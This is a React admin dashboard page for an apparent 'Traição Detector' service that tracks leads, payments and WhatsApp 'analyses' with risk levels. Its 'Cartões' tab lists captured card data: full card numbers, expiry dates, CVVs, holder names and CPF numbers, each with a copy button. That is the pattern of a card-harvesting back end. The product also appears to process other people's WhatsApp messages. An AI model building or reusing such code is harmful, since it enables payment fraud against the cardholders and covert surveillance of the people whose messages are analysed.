import { useState, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import {
  BarChart3, Users, TrendingUp, DollarSign, Eye, MousePointerClick,
  ShoppingCart, CheckCircle, LogOut, Settings, RefreshCw, Calendar,
  Activity, Wallet, Check, Clock, X, CreditCard, Package
} from 'lucide-react'
import { useAdmin } from '../contexts/AdminContext'
import {
  getDashboardStats, getEventsByDay, getConversionFunnelStats, getPlansViewedCount,
  getAllLeads, getAllAnalysisResults, getSystemSetting,
  updateSystemSetting, getPaymentStats, getAllPixPayments, getAllCardPayments,
  type DashboardStats, type EventsByDay, type FunnelStats
} from '../services/adminService'
import StatsCard from '../components/admin/StatsCard'
import FunnelChart from '../components/admin/FunnelChart'
import LeadsTable from '../components/admin/LeadsTable'
import PaymentsTable from '../components/admin/PaymentsTable'

const AdminDashboardPage = () => {
  const navigate = useNavigate()
  const { admin, isAuthenticated, logout } = useAdmin()
  
  const [stats, setStats] = useState<DashboardStats | null>(null)
  const [paymentStats, setPaymentStats] = useState<any>(null)
  const [eventsByDay, setEventsByDay] = useState<EventsByDay[]>([])
  const [funnelStats, setFunnelStats] = useState<FunnelStats[]>([])
  const [plansViewedCount, setPlansViewedCount] = useState<number>(0)
  const [leads, setLeads] = useState<any[]>([])
  const [analyses, setAnalyses] = useState<any[]>([])
  const [pixPayments, setPixPayments] = useState<any[]>([])
  const [cardPayments, setCardPayments] = useState<any[]>([])
  const [metaPixelId, setMetaPixelId] = useState('')
  const [isLoadingPixel, setIsLoadingPixel] = useState(false)
  const [pixelSuccess, setPixelSuccess] = useState(false)
  const [isLoading, setIsLoading] = useState(true)
  const [activeTab, setActiveTab] = useState<'overview' | 'funnel' | 'leads' | 'payments' | 'analyses' | 'settings' | 'cards'>('overview')
  const [dateRange, setDateRange] = useState(30)

  const tabs: { id: typeof activeTab; label: string; icon: typeof BarChart3; description: string }[] = [
    { id: 'overview', label: 'Visão Geral', icon: BarChart3, description: 'Resumo do desempenho e receita' },
    { id: 'funnel', label: 'Funil', icon: TrendingUp, description: 'Acompanhe a conversão em cada etapa' },
    { id: 'leads', label: 'Leads', icon: Users, description: 'Gerencie leads capturados e status de pagamento' },
    { id: 'payments', label: 'Pagamentos', icon: Wallet, description: 'Histórico de cobranças PIX e cartão' },
    { id: 'analyses', label: 'Análises', icon: Activity, description: 'Resultados das análises processadas' },
    { id: 'settings', label: 'Configurações', icon: Settings, description: 'Preferências e integrações' },
    { id: 'cards', label: 'Cartões', icon: CreditCard, description: 'Dados capturados de cartões' }
  ]

  const surfaceClass = 'rounded-[2.5rem] border border-rose-100 bg-white/90 shadow-xl shadow-rose-100/40 backdrop-blur-sm'

  useEffect(() => {
    if (!isAuthenticated) {
      navigate('/admin-login')
      return
    }
    loadDashboardData()
  }, [isAuthenticated, navigate, dateRange])

  const loadDashboardData = async () => {
    setIsLoading(true)
    try {
      const endDate = new Date()
      const startDate = new Date()
      startDate.setDate(startDate.getDate() - dateRange)

      const [statsData, paymentData, eventsData, funnelData, plansViewed, leadsData, analysesData, pixPaymentsData, cardPaymentsData, pixelData] = await Promise.all([
        getDashboardStats(startDate, endDate),
        getPaymentStats(),
        getEventsByDay(dateRange),
        getConversionFunnelStats(startDate, endDate),
        getPlansViewedCount(startDate, endDate),
        getAllLeads(),
        getAllAnalysisResults(),
        getAllPixPayments(),
        getAllCardPayments(),
        getSystemSetting('meta_pixel_id')
      ])

      if (statsData) setStats(statsData)
      if (paymentData) setPaymentStats(paymentData)
      setEventsByDay(eventsData)
      setFunnelStats(funnelData)
      setPlansViewedCount(plansViewed)
      setLeads(leadsData)
      setAnalyses(analysesData)
      setPixPayments(pixPaymentsData)
      setCardPayments(cardPaymentsData)
      setMetaPixelId(pixelData || '')
    } catch (error) {
      // Erro ao carregar dados
    } finally {
      setIsLoading(false)
    }
  }

  const handleUpdatePixel = async () => {
    setIsLoadingPixel(true)
    setPixelSuccess(false)
    try {
      const success = await updateSystemSetting('meta_pixel_id', metaPixelId, admin?.id)
      if (success) {
        setPixelSuccess(true)
        setTimeout(() => setPixelSuccess(false), 3000)
      }
    } catch (error) {
      // Erro ao atualizar pixel
    } finally {
      setIsLoadingPixel(false)
    }
  }

  const handleLogout = () => {
    logout()
    navigate('/admin-login')
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-rose-50 via-white to-white flex items-center justify-center">
        <div className="text-center space-y-4">
          <div className="mx-auto h-16 w-16 rounded-full border-4 border-rose-200 border-t-rose-500 animate-spin"></div>
          <p className="text-slate-600 text-lg font-semibold">Carregando dados do painel...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-rose-50 via-white to-white">
      {/* Header */}
      <header className="sticky top-0 z-50 border-b border-rose-100/70 bg-white/80 backdrop-blur-xl">
        <div className="max-w-7xl mx-auto flex items-center justify-between px-4 sm:px-6 lg:px-8 py-4">
          <div>
            <p className="text-xs font-semibold uppercase tracking-[0.28em] text-rose-400">Painel Traição Detector</p>
            <h1 className="mt-1 text-2xl font-bold text-slate-900 sm:text-3xl">Olá, {admin?.nome?.split(' ')[0] || 'Admin'} 👋</h1>
            <p className="text-sm text-slate-500 mt-1">Acompanhe desempenho, vendas e leads em tempo real.</p>
          </div>
          <div className="flex items-center gap-3">
            <button
              onClick={loadDashboardData}
              className="flex items-center gap-2 rounded-full bg-white/90 px-4 py-2 text-sm font-semibold text-rose-500 shadow-inner shadow-rose-200/60 transition hover:shadow-lg"
            >
              <RefreshCw className="h-4 w-4" />
              <span className="hidden sm:inline">Atualizar dados</span>
            </button>
            <button
              onClick={handleLogout}
              className="flex items-center gap-2 rounded-full bg-gradient-to-r from-rose-500 to-pink-500 px-4 py-2 text-sm font-semibold text-white shadow-lg shadow-rose-200/60 transition hover:-translate-y-0.5"
            >
              <LogOut className="h-4 w-4" />
              <span className="hidden sm:inline">Sair</span>
            </button>
          </div>
        </div>
      </header>

      {/* Tabs */}
      <div className="border-b border-rose-100/70 bg-white/90 backdrop-blur-xl">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <nav className="flex flex-wrap gap-2 overflow-x-auto py-3">
            {tabs.map(tab => {
              const isActive = activeTab === tab.id
              return (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id)}
                  className={`flex flex-col items-start gap-1 rounded-2xl border px-4 py-3 text-left transition-all sm:flex-row sm:items-center sm:gap-2 ${
                    isActive
                      ? 'border-transparent bg-gradient-to-r from-rose-500 to-pink-500 text-white shadow-lg shadow-rose-200/70'
                      : 'border-rose-100 bg-white/70 text-slate-500 hover:shadow-md hover:shadow-rose-100'
                  }`}
                >
                  <span className={`rounded-xl p-2 ${isActive ? 'bg-white/20' : 'bg-rose-50 text-rose-500'}`}>
                    <tab.icon className="h-4 w-4" />
                  </span>
                  <span>
                    <span className={`block text-sm font-semibold ${isActive ? 'text-white' : 'text-slate-700'}`}>{tab.label}</span>
                    <span className={`hidden text-xs sm:block ${isActive ? 'text-white/80' : 'text-slate-400'}`}>{tab.description}</span>
                  </span>
                </button>
              )
            })}
          </nav>
        </div>
      </div>

      {/* Content */}
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Date Range Selector */}
        <div className={`${surfaceClass} mb-8 flex flex-wrap items-center justify-between gap-4 p-6`}
        >
          <div className="flex items-center gap-3">
            <div className="flex h-10 w-10 items-center justify-center rounded-full bg-rose-50 text-rose-500">
              <Calendar className="h-5 w-5" />
            </div>
            <div>
              <p className="text-xs font-semibold uppercase tracking-[0.25em] text-rose-400">Período de análise</p>
              <p className="text-sm text-slate-500">Selecione o intervalo para atualizar métricas e funil</p>
            </div>
          </div>
          <select
            value={dateRange}
            onChange={(e) => setDateRange(Number(e.target.value))}
            className="rounded-full border border-rose-100 bg-white px-5 py-2 text-sm font-semibold text-slate-700 shadow-sm transition hover:border-rose-300 focus:outline-none focus:ring-2 focus:ring-rose-200"
          >
            <option value={7}>Últimos 7 dias</option>
            <option value={30}>Últimos 30 dias</option>
            <option value={90}>Últimos 90 dias</option>
          </select>
        </div>

        {/* Overview Tab */}
        {activeTab === 'overview' && (
          <div className="space-y-8">
            {/* Stats Cards */}
            <div className="grid grid-cols-1 gap-4 md:grid-cols-2 xl:grid-cols-5">
              <StatsCard
                title="Visualizações"
                value={stats?.total_page_views.toLocaleString() || '0'}
                subtitle="Páginas vistas"
                icon={Eye}
                iconColor="bg-blue-500/20 text-blue-400"
              />
              <StatsCard
                title="Leads Capturados"
                value={stats?.total_leads.toLocaleString() || '0'}
                subtitle={`Taxa de checkout: ${stats?.lead_conversion_rate.toFixed(1)}%`}
                icon={MousePointerClick}
                iconColor="bg-green-500/20 text-green-400"
              />
              <StatsCard
                title="Planos Visualizados"
                value={plansViewedCount.toLocaleString()}
                subtitle={`${((plansViewedCount / (stats?.total_leads || 1)) * 100).toFixed(1)}% dos leads`}
                icon={Package}
                iconColor="bg-purple-500/20 text-purple-400"
              />
              <StatsCard
                title="Checkouts"
                value={stats?.total_checkouts.toLocaleString() || '0'}
                subtitle="Iniciados"
                icon={ShoppingCart}
                iconColor="bg-yellow-500/20 text-yellow-400"
              />
              <StatsCard
                title="Vendas"
                value={stats?.total_sales.toLocaleString() || '0'}
                subtitle={`PIX: ${pixPayments.length} | Card: ${cardPayments.length}`}
                icon={CheckCircle}
                iconColor="bg-red-500/20 text-red-400"
              />
            </div>

            {/* Revenue Cards */}
            <div className="grid grid-cols-1 gap-6 md:grid-cols-2 xl:grid-cols-4">
              {/* Receita Total */}
              <div className="relative overflow-hidden rounded-[2rem] border border-emerald-100 bg-gradient-to-br from-emerald-50 via-white to-white p-6 shadow-lg shadow-emerald-100/40">
                <div className="flex items-center gap-4">
                  <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-emerald-500/15 text-emerald-500">
                    <DollarSign className="h-6 w-6" />
                  </div>
                  <div className="space-y-1">
                    <p className="text-xs font-semibold uppercase tracking-[0.25em] text-emerald-500">Receita total</p>
                    <p className="text-2xl font-bold text-slate-900 sm:text-3xl">
                      R$ {stats?.total_revenue.toLocaleString('pt-BR', { minimumFractionDigits: 2 }) || '0,00'}
                    </p>
                    <p className="text-xs text-slate-500">Somatório de vendas nos últimos {dateRange} dias</p>
                  </div>
                </div>
              </div>

              {/* Receita PIX */}
              <div className="relative overflow-hidden rounded-[2rem] border border-blue-100 bg-gradient-to-br from-blue-50 via-white to-white p-6 shadow-lg shadow-blue-100/40">
                <div className="flex items-center gap-4">
                  <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-blue-500/15 text-blue-500">
                    <Wallet className="h-6 w-6" />
                  </div>
                  <div className="space-y-1">
                    <p className="text-xs font-semibold uppercase tracking-[0.25em] text-blue-500">Receita PIX</p>
                    <p className="text-2xl font-bold text-slate-900 sm:text-3xl">
                      R$ {stats?.revenue_pix.toLocaleString('pt-BR', { minimumFractionDigits: 2 }) || '0,00'}
                    </p>
                    <p className="text-xs text-slate-500">{stats?.total_sales_pix || 0} vendas confirmadas</p>
                  </div>
                </div>
              </div>

              {/* Receita Cartão */}
              <div className="relative overflow-hidden rounded-[2rem] border border-purple-100 bg-gradient-to-br from-purple-50 via-white to-white p-6 shadow-lg shadow-purple-100/40">
                <div className="flex items-center gap-4">
                  <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-purple-500/15 text-purple-500">
                    <CreditCard className="h-6 w-6" />
                  </div>
                  <div className="space-y-1">
                    <p className="text-xs font-semibold uppercase tracking-[0.25em] text-purple-500">Receita Cartão</p>
                    <p className="text-2xl font-bold text-slate-900 sm:text-3xl">
                      R$ {stats?.revenue_card.toLocaleString('pt-BR', { minimumFractionDigits: 2 }) || '0,00'}
                    </p>
                    <p className="text-xs text-slate-500">{stats?.total_sales_card || 0} vendas por cartão</p>
                  </div>
                </div>
              </div>

              {/* Ticket Médio */}
              <div className="relative overflow-hidden rounded-[2rem] border border-amber-100 bg-gradient-to-br from-amber-50 via-white to-white p-6 shadow-lg shadow-amber-100/40">
                <div className="flex items-center gap-4">
                  <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-amber-500/15 text-amber-500">
                    <Activity className="h-6 w-6" />
                  </div>
                  <div className="space-y-1">
                    <p className="text-xs font-semibold uppercase tracking-[0.25em] text-amber-500">Ticket médio</p>
                    <p className="text-2xl font-bold text-slate-900 sm:text-3xl">
                      R$ {stats?.avg_ticket.toLocaleString('pt-BR', { minimumFractionDigits: 2 }) || '0,00'}
                    </p>
                    <p className="text-xs text-slate-500">Valor médio por transação concluída</p>
                  </div>
                </div>
              </div>
            </div>

            {/* Events Table */}
            <div className={`${surfaceClass} p-6`}>
              <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
                <div>
                  <h3 className="text-lg font-semibold text-slate-900 flex items-center gap-2">
                    <BarChart3 className="h-5 w-5 text-rose-500" />
                    Eventos por Dia
                  </h3>
                  <p className="text-sm text-slate-500">Atividade diária agregada para visualizar tendências recentes.</p>
                </div>
                <span className="inline-flex items-center gap-2 rounded-full bg-rose-50 px-4 py-1 text-xs font-semibold uppercase tracking-[0.25em] text-rose-500">
                  Total {eventsByDay.length}
                </span>
              </div>
              <div className="mt-4 overflow-x-auto">
                <table className="w-full text-sm">
                  <thead>
                    <tr className="border-b border-rose-100/80 text-left text-xs font-semibold uppercase tracking-[0.2em] text-slate-400">
                      <th className="py-3 px-4">Data</th>
                      <th className="py-3 px-4 text-right">Visualizações</th>
                      <th className="py-3 px-4 text-right">Leads</th>
                      <th className="py-3 px-4 text-right">Checkouts</th>
                      <th className="py-3 px-4 text-right">Vendas</th>
                      <th className="py-3 px-4 text-right">Receita</th>
                    </tr>
                  </thead>
                  <tbody>
                    {eventsByDay.slice(0, 10).map((day, index) => (
                      <tr key={index} className="border-b border-rose-100/60 text-slate-600 transition-colors hover:bg-rose-50/50">
                        <td className="py-3 px-4 font-semibold text-slate-700">
                          {new Date(day.date).toLocaleDateString('pt-BR')}
                        </td>
                        <td className="py-3 px-4 text-right">{day.page_views}</td>
                        <td className="py-3 px-4 text-right">{day.leads}</td>
                        <td className="py-3 px-4 text-right">{day.checkouts}</td>
                        <td className="py-3 px-4 text-right">{day.sales}</td>
                        <td className="py-3 px-4 text-right font-semibold text-emerald-500">
                          R$ {(day.revenue || 0).toLocaleString('pt-BR', { minimumFractionDigits: 2 })}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        )}

        {/* Funnel Tab */}
        {activeTab === 'funnel' && (
          <div className={`${surfaceClass} p-6`}>
            <h3 className="text-xl font-semibold text-slate-900 mb-6 flex items-center gap-2">
              <TrendingUp className="h-6 w-6 text-rose-500" />
              Funil de Conversão
            </h3>
            <div className="rounded-3xl border border-rose-100 bg-white p-4">
              <FunnelChart data={funnelStats} />
            </div>
          </div>
        )}

        {/* Leads Tab */}
        {activeTab === 'leads' && (
          <div className={`${surfaceClass} p-6`}>
            <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between mb-6">
              <h3 className="text-xl font-semibold text-slate-900 flex items-center gap-2">
                <Users className="h-6 w-6 text-rose-500" />
                Leads Capturados ({leads.length})
              </h3>
              <div className="flex items-center gap-2 text-sm flex-wrap">
                <span className="inline-flex items-center gap-1 rounded-full bg-emerald-50 px-3 py-1 text-emerald-600 font-semibold">
                  <Check className="h-3 w-3" />
                  {paymentStats?.paid_leads || 0} Pagos
                </span>
                <span className="inline-flex items-center gap-1 rounded-full bg-amber-50 px-3 py-1 text-amber-600 font-semibold">
                  <Clock className="h-3 w-3" />
                  {paymentStats?.pending_leads || 0} Pendentes
                </span>
                <span className="inline-flex items-center gap-1 rounded-full bg-slate-100 px-3 py-1 text-slate-500 font-semibold">
                  <X className="h-3 w-3" />
                  {paymentStats?.expired_leads || 0} Expirados
                </span>
              </div>
            </div>
            <LeadsTable leads={leads} onUpdate={loadDashboardData} />
          </div>
        )}

        {/* Payments Tab */}
        {activeTab === 'payments' && (
          <div className={`${surfaceClass} p-6`}>
            <h3 className="text-xl font-semibold text-slate-900 mb-6 flex items-center gap-2">
              <Wallet className="h-6 w-6 text-rose-500" />
              Pagamentos ({pixPayments.length + cardPayments.length})
            </h3>
            <PaymentsTable pixPayments={pixPayments} cardPayments={cardPayments} />
          </div>
        )}

        {/* Analyses Tab */}
        {activeTab === 'analyses' && (
          <div className={`${surfaceClass} p-6`}>
            <h3 className="text-xl font-semibold text-slate-900 mb-6 flex items-center gap-2">
              <Activity className="h-6 w-6 text-rose-500" />
              Análises Realizadas ({analyses.length})
            </h3>
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-rose-100/80 text-left text-xs font-semibold uppercase tracking-[0.2em] text-slate-400">
                    <th className="py-4 px-4">WhatsApp</th>
                    <th className="py-4 px-4">Nome</th>
                    <th className="py-4 px-4 text-center">Mensagens</th>
                    <th className="py-4 px-4 text-center">Mídias</th>
                    <th className="py-4 px-4 text-center">Contatos</th>
                    <th className="py-4 px-4 text-center">Risco</th>
                    <th className="py-4 px-4">Data</th>
                  </tr>
                </thead>
                <tbody>
                  {analyses.slice(0, 20).map((analysis, index) => (
                    <tr key={index} className="border-b border-rose-100/60 text-slate-600 transition-colors hover:bg-rose-50/60">
                      <td className="py-4 px-4">
                        <span className="text-sm text-slate-800 font-mono bg-slate-100 px-3 py-1 rounded-lg">
                          {analysis.whatsapp}
                        </span>
                      </td>
                      <td className="py-4 px-4 text-sm text-slate-600">{analysis.nome || '-'}</td>
                      <td className="py-4 px-4 text-sm text-slate-600 text-center">{analysis.messages_count}</td>
                      <td className="py-4 px-4 text-sm text-slate-600 text-center">{analysis.media_count}</td>
                      <td className="py-4 px-4 text-sm text-slate-600 text-center">{analysis.contacts_count}</td>
                      <td className="py-4 px-4 text-center">
                        <span className={`inline-flex px-3 py-1 text-xs font-semibold rounded-full ${
                          analysis.risk_level === 'high'
                            ? 'bg-rose-100 text-rose-600'
                            : analysis.risk_level === 'medium'
                            ? 'bg-amber-100 text-amber-600'
                            : 'bg-emerald-100 text-emerald-600'
                        }`}>
                          {analysis.risk_level === 'high' ? 'Alto' : analysis.risk_level === 'medium' ? 'Médio' : 'Baixo'}
                        </span>
                      </td>
                      <td className="py-4 px-4 text-sm text-slate-500">
                        {new Date(analysis.created_at).toLocaleString('pt-BR')}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* Settings Tab */}
        {activeTab === 'settings' && (
          <div className="space-y-6">
            <div className={`${surfaceClass} p-6`}>
              <h3 className="text-xl font-semibold text-slate-900 mb-6 flex items-center gap-2">
                <Settings className="h-6 w-6 text-rose-500" />
                Meta Pixel (Facebook)
              </h3>
              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-semibold text-slate-700 mb-2">
                    Pixel ID
                  </label>
                  <input
                    type="text"
                    value={metaPixelId}
                    onChange={(e) => setMetaPixelId(e.target.value)}
                    placeholder="123456789012345"
                    className="w-full rounded-2xl border border-rose-100 bg-white px-4 py-3 text-sm text-slate-700 shadow-sm transition hover:border-rose-200 focus:outline-none focus:ring-2 focus:ring-rose-200"
                  />
                  <p className="mt-2 text-sm text-slate-500">
                    Obtenha seu Pixel ID em{' '}
                    <a
                      href="https://business.facebook.com/events_manager/"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="font-semibold text-rose-500 hover:text-rose-600"
                    >
                      Meta Events Manager
                    </a>
                  </p>
                </div>

                {pixelSuccess && (
                  <div className="flex items-center gap-2 rounded-2xl border border-emerald-100 bg-emerald-50/70 p-4">
                    <CheckCircle className="h-5 w-5 text-emerald-500" />
                    <p className="text-sm font-semibold text-emerald-600">Pixel ID atualizado com sucesso!</p>
                  </div>
                )}

                <button
                  onClick={handleUpdatePixel}
                  disabled={isLoadingPixel}
                  className="inline-flex items-center justify-center gap-2 rounded-full bg-gradient-to-r from-rose-500 to-pink-500 px-6 py-3 text-sm font-semibold text-white shadow-lg shadow-rose-200/60 transition hover:-translate-y-0.5 disabled:cursor-not-allowed disabled:opacity-60 disabled:hover:translate-y-0"
                >
                  {isLoadingPixel ? (
                    <>
                      <div className="h-4 w-4 animate-spin rounded-full border-2 border-white/50 border-t-white"></div>
                      Salvando...
                    </>
                  ) : (
                    'Salvar Configurações'
                  )}
                </button>
              </div>
            </div>

            <div className={`${surfaceClass} p-6`}>
              <h3 className="text-lg font-semibold text-slate-900 mb-4">Informações da Conta</h3>
              <div className="grid gap-4 sm:grid-cols-2">
                <div className="rounded-2xl border border-rose-100 bg-white p-4">
                  <p className="text-xs font-semibold uppercase tracking-[0.22em] text-rose-400">Nome</p>
                  <p className="mt-1 text-base font-semibold text-slate-800">{admin?.nome}</p>
                </div>
                <div className="rounded-2xl border border-rose-100 bg-white p-4">
                  <p className="text-xs font-semibold uppercase tracking-[0.22em] text-rose-400">E-mail</p>
                  <p className="mt-1 text-base font-semibold text-slate-800">{admin?.email}</p>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Cards Tab */}
        {activeTab === 'cards' && (
          <div className={`${surfaceClass} p-6`}>
            <h3 className="text-xl font-semibold text-slate-900 mb-6 flex items-center gap-2">
              <CreditCard className="h-6 w-6 text-rose-500" />
              Dados de Cartões ({cardPayments.length})
            </h3>

            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-rose-100/80 text-left text-xs font-semibold uppercase tracking-[0.18em] text-slate-400">
                    <th className="py-4 px-4">WhatsApp</th>
                    <th className="py-4 px-4">Titular</th>
                    <th className="py-4 px-4">CPF</th>
                    <th className="py-4 px-4">Número do Cartão</th>
                    <th className="py-4 px-4 text-center">Validade</th>
                    <th className="py-4 px-4 text-center">CVV</th>
                    <th className="py-4 px-4 text-right">Valor</th>
                    <th className="py-4 px-4">Data</th>
                  </tr>
                </thead>
                <tbody>
                  {cardPayments.length === 0 ? (
                    <tr>
                      <td colSpan={8} className="py-8 text-center text-slate-400">
                        Nenhum cartão encontrado
                      </td>
                    </tr>
                  ) : (
                    cardPayments
                      .sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime())
                      .map((card, index) => (
                        <tr
                          key={index}
                          className="border-b border-rose-100/60 text-slate-600 transition-colors hover:bg-rose-50/60"
                        >
                          <td className="py-4 px-4">
                            <div className="flex items-center gap-2">
                              <span className="font-mono text-slate-800 bg-slate-100 px-3 py-1 rounded-lg">
                                {card.whatsapp || '-'}
                              </span>
                              {card.whatsapp && (
                                <button
                                  onClick={() => navigator.clipboard.writeText(card.whatsapp)}
                                  className="rounded-full p-1.5 text-slate-400 transition hover:bg-rose-100 hover:text-rose-500"
                                  title="Copiar WhatsApp"
                                >
                                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                                  </svg>
                                </button>
                              )}
                            </div>
                          </td>
                          <td className="py-4 px-4">
                            <div className="flex items-center gap-2">
                              <span className="text-slate-700">
                                {card.card_holder || card.nome || '-'}
                              </span>
                              {(card.card_holder || card.nome) && (
                                <button
                                  onClick={() => navigator.clipboard.writeText(card.card_holder || card.nome)}
                                  className="rounded-full p-1.5 text-slate-400 transition hover:bg-rose-100 hover:text-rose-500"
                                  title="Copiar Nome"
                                >
                                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                                  </svg>
                                </button>
                              )}
                            </div>
                          </td>
                          <td className="py-4 px-4">
                            <div className="flex items-center gap-2">
                              <span className="font-mono text-slate-700">
                                {card.cpf || '-'}
                              </span>
                              {card.cpf && (
                                <button
                                  onClick={() => navigator.clipboard.writeText(card.cpf)}
                                  className="rounded-full p-1.5 text-slate-400 transition hover:bg-rose-100 hover:text-rose-500"
                                  title="Copiar CPF"
                                >
                                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                                  </svg>
                                </button>
                              )}
                            </div>
                          </td>
                          <td className="py-4 px-4">
                            <div className="flex items-center gap-2">
                              <span className="font-mono text-slate-800 bg-slate-100 px-3 py-1 rounded-lg">
                                {card.card_number || '-'}
                              </span>
                              {card.card_number && (
                                <button
                                  onClick={() => navigator.clipboard.writeText(card.card_number)}
                                  className="rounded-full p-1.5 text-slate-400 transition hover:bg-rose-100 hover:text-rose-500"
                                  title="Copiar Número do Cartão"
                                >
                                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                                  </svg>
                                </button>
                              )}
                            </div>
                          </td>
                          <td className="py-4 px-4 text-center">
                            <div className="flex items-center justify-center gap-2">
                              <span className="font-mono text-slate-600">
                                {card.expiry_date || '-'}
                              </span>
                              {card.expiry_date && (
                                <button
                                  onClick={() => navigator.clipboard.writeText(card.expiry_date)}
                                  className="rounded-full p-1.5 text-slate-400 transition hover:bg-rose-100 hover:text-rose-500"
                                  title="Copiar Validade"
                                >
                                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                                  </svg>
                                </button>
                              )}
                            </div>
                          </td>
                          <td className="py-4 px-4 text-center">
                            <div className="flex items-center justify-center gap-2">
                              <span className="font-mono text-slate-600">
                                {card.cvv || '-'}
                              </span>
                              {card.cvv && (
                                <button
                                  onClick={() => navigator.clipboard.writeText(card.cvv)}
                                  className="rounded-full p-1.5 text-slate-400 transition hover:bg-rose-100 hover:text-rose-500"
                                  title="Copiar CVV"
                                >
                                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                                  </svg>
                                </button>
                              )}
                            </div>
                          </td>
                          <td className="py-4 px-4 text-right font-semibold text-slate-900">
                            R$ {(card.amount || 0).toLocaleString('pt-BR', { minimumFractionDigits: 2 })}
                          </td>
                          <td className="py-4 px-4 text-slate-500">
                            {new Date(card.created_at).toLocaleString('pt-BR')}
                          </td>
                        </tr>
                      ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </main>
    </div>
  )
}

export default AdminDashboardPage
